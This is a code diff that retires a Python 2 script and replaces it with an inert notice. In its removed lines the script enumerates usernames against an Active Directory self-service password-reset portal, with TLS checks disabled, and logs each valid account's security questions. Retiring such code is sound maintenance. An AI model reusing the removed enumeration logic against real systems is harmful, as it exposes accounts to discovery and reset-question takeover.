@@ -1,39 +1,9 @@
-import requests
-import re
+#!/usr/bin/env python3
+"""Retired unsafe legacy example.
 
-good_re = re.compile(r'Time left for this operation')
-ques_re = re.compile(r'<td align="left">(.*)\?</td>')
+The former code probed an AD self-service password-reset endpoint, disabled TLS verification, and enumerated account behavior. Use approved identity-provider audit tools and authentication logs.
+This path is retained as an inert notice; it contains no former executable
+payload, credential collection, or network code.
+"""
 
-
-def check_user(username):
-    s = requests.Session()
-    s.verify = False
-    s.get(server + '/accounts/Reset')
-
-    data = {'userName': username,
-            'DOMAIN_FLAT_NAME': domain}
-    resp = s.post(server + '/accounts/PasswordSelfService', data=data)
-    m = good_re.search(resp.content)
-
-    if m is not None:
-        m = ques_re.findall(resp.content)
-        out.write("{0}:\n".format(username))
-        for q in m:
-            out.write("\t{0}?\n".format(q))
-        else:
-            print "{0} is invalid.".format(username)
-
-server = 'https://server'
-domain = 'DOMAIN'
-out = open('ad_self_service_miner.log', 'w')
-
-for f in open('firstnames.txt'):
-    f.strip()
-    for l in open('lastnames.txt'):
-        l.strip()
-        # Modify the user variable to match the username pattern of the target
-        user = "{0}.{1}".format(f.capitalize(), l.capitalize())
-        check_user(user)
-        out.flush()
-
-out.close()
+raise SystemExit("Retired unsafe legacy example; see the module notice.")
